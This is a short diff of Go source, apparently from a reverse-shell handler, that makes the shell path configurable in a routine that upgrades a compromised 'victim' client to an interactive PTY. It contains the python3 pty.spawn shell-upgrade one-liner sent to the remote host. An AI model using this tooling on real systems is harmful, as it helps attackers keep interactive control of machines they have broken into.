@@ -91,6 +91,10 @@ func (c *TCPClient) GetHashFormat() string {
 	return c.server.hashFormat
 }
 
+func (c *TCPClient) GetShellPath() string {
+	return c.server.ShellPath
+}
+
 func (c *TCPClient) GetConn() net.Conn {
 	return c.conn
 }
@@ -591,8 +595,8 @@ func (c *TCPClient) EstablishPTY() error {
 	}
 
 	// Step 1: Spawn /bin/sh via pty of victim
-	command := "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
-	log.Info("spawning /bin/bash on the current client")
+	command := "python3 -c 'import pty;pty.spawn(\"" + c.GetShellPath() + "\")'"
+	log.Info("spawning " + c.GetShellPath() + " on the current client")
 	c.System(command)
 
 	// TODO: Check whether pty is established
@@ -606,7 +610,8 @@ func (c *TCPClient) EstablishPTY() error {
 	log.Info("reseting client terminal...")
 	c.System("reset")
 	log.Info("reseting client SHELL...")
-	c.System("export SHELL=bash")
+	command = fmt.Sprintf("export SHELL=%s", c.GetShellPath())
+	c.System(command)
 	log.Info("reseting client TERM colors...")
 	c.System("export TERM=xterm-256color")
 	log.Info("reseting client window size...")
